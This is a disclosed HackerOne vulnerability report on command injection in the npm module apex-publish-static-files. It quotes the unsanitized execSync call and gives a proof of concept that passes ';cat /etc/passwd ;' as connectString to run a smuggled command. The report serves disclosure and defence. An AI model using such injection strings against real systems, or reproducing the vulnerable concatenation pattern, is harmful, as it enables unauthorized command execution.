---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '405694'
original_report_id: '405694'
title: '[apex-publish-static-files] Command Injection on connectString'
weakness: Command Injection - Generic
team_handle: nodejs-ecosystem
created_at: '2018-09-05T01:49:30.554Z'
disclosed_at: '2018-10-18T18:32:08.981Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 10
asset_identifier: apex-publish-static-files
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- command-injection-generic
---

# [apex-publish-static-files] Command Injection on connectString

## Metadata

- HackerOne Report ID: 405694
- Weakness: Command Injection - Generic
- Program: nodejs-ecosystem
- Disclosed At: 2018-10-18T18:32:08.981Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a command injection vulnerability in the apex-publish-static-files npm module.
It allows arbitrary shell command execution through a maliciously crafted argument.

# Module

**module name:** apex-publish-static-files
**version:** 2.0.0
**npm page:** `https://www.npmjs.com/package/apex-publish-static-files`

## Module Description

>Uploads all files from a local directory to Oracle APEX

## Module Stats

15 downloads in the last day
~170 downloads in the last month

# Vulnerability

## Vulnerability Description

apex-publish-static-files does not sanitize the connectionString argument, and subsequently passes it to execSync(), thus allowing arbitrary shell command injection. 

Vulnerability Code : [https://github.com/vincentmorneau/apex-publish-static-files/blob/master/index.js#54-66](https://github.com/vincentmorneau/apex-publish-static-files/blob/master/index.js#54-66)

```
			const childProcess = execSync(
				'"' + opts.sqlclPath + '"' + // Sqlcl path
				' ' + opts.connectString + // Connect string (user/pass@server:port/sid)
				' @"' + path.resolve(__dirname, 'lib/script') + '"' + // Sql to execute
				' "' + path.resolve(__dirname, 'lib/distUpload.js') + '"' + // Param &1 (js to execute)
				' "' + path.resolve(opts.directory) + '"' + // Param &2
				' ' + opts.appID + // Param &3
				' "' + opts.destination + '"' + // Param &4
				' "' + opts.pluginName + '"' // Param &5
				, {
					encoding: 'utf8'
				}
			);
```


## Steps To Reproduce:

- npm i apex-publish-static-files
- create index.js file like this :

```
var publisher = require('apex-publish-static-files');
 
publisher.publish({
connectString: ";cat /etc/passwd ;",
    directory: "public",
    appID: 111
});
```
- execute `node index.js`

F342500

## Supporting Material/References:

OS: WSL Ubuntu 16.04
NODE: v10.8.0
NPM : 6.2.0


# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

It allows arbitrary shell command execution through a maliciously crafted argument.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
